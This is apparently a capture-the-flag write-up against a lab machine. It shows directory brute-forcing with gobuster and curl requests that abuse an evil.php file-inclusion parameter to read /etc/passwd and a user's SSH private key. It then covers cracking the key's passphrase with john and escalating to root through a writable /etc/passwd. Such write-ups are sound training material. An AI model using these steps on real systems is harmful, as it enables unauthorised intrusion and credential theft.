...
$ gobuster dir -u http://$IP/secret/ -w /usr/share/wordlists/dirb/common.txt                                   
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
...
the `secret/index.html` just returns four newlines. any poking around has no effect, not responding to post, headers or parameters.

so extensive search in the secret folder:

```bash
 gobuster dir -u http://192.168.10.15/secret/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x '.php,.html,.txt' 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
...
```bash
$ curl http://$IP/secret/evil.php?cmd=id                                   
                                                                                                                   
$ curl http://$IP/secret/evil.php?cmd=/etc/passwd
                                                                                                                   
$ curl http://$IP/secret/evil.php?command=id     
                                                                                                                   
$ curl http://$IP/secret/evil.php?command=/etc/passwd
...
using `?command=` we can get files. there is a user called `mowree`.

```bash
$ curl http://$IP/secret/evil.php?command=/home/mowree/user.txt
                                                                                                                   
$ curl http://$IP/secret/evil.php?command=/home/mowree/.ssh/id_rsa      
...
it has a password. cracking it with john
...
the password is `unicorn`, so connect again:
...
running linpeas shows that `/etc/passwd` is writeable, so hash a new password and write it to the root
